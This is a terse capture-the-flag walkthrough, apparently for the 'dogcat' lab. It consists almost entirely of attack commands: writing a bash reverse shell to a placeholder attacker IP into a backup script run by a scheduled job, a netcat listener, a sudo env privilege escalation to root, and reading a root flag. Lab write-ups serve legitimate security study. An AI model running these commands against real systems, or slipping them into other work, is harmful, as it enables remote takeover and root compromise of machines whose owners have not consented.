## Get reverse shell in Docker 

### In dogcat shell
```bash
cd /opt/backups
echo "#!/bin/bash" > backup.sh
echo "/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/9595 0>&1'" >> backup.sh
```

### In Kali
``nc -nvlp 9595``

## Recon
```bash
sudo -l
(root) NOPASSWD: /usr/bin/env
```
### Privesc
``sudo /usr/bin/env /bin/bash``

### Flag
``cat /root/flag3.txt``
